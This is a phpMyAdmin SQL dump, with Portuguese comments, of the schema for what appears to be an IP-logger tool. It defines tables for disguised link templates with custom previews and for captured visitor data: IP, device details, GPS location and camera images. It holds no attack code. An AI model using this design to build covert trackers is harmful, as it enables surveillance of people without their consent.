-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Tempo de geração: 17/04/2025 às 17:00
-- Versão do servidor: 10.4.32-MariaDB
-- Versão do PHP: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `bt`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `badtrips`
--

CREATE TABLE `badtrips` (
  `id` int(11) NOT NULL,
  `iplogger_id` varchar(64) NOT NULL,
  `user_id` varchar(64) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `device_data` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL CHECK (json_valid(`device_data`)),
  `ip_location` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL CHECK (json_valid(`ip_location`)),
  `gps_location` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL CHECK (json_valid(`gps_location`)),
  `cam_image` varchar(64) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `iploggers`
--

CREATE TABLE `iploggers` (
  `id` varchar(64) NOT NULL,
  `user_id` varchar(64) NOT NULL,
  `template` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL CHECK (json_valid(`template`)),
  `title_preview` varchar(128) NOT NULL,
  `description_preview` varchar(256) NOT NULL,
  `image_preview` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL CHECK (json_valid(`image_preview`)),
  `device_data` tinyint(1) NOT NULL,
  `location_data` tinyint(1) NOT NULL,
  `cam_data` tinyint(1) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `users`
--

CREATE TABLE `users` (
  `id` varchar(64) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `badtrips`
--
ALTER TABLE `badtrips`
  ADD PRIMARY KEY (`id`),
  ADD KEY `iplogger_id` (`iplogger_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Índices de tabela `iploggers`
--
ALTER TABLE `iploggers`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_iplogger` (`user_id`);

--
-- Índices de tabela `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `badtrips`
--
ALTER TABLE `badtrips`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Restrições para tabelas despejadas
--

--
-- Restrições para tabelas `badtrips`
--
ALTER TABLE `badtrips`
  ADD CONSTRAINT `badtrips_ibfk_1` FOREIGN KEY (`iplogger_id`) REFERENCES `iploggers` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `badtrips_ibfk_2` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- Restrições para tabelas `iploggers`
--
ALTER TABLE `iploggers`
  ADD CONSTRAINT `user_iplogger` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
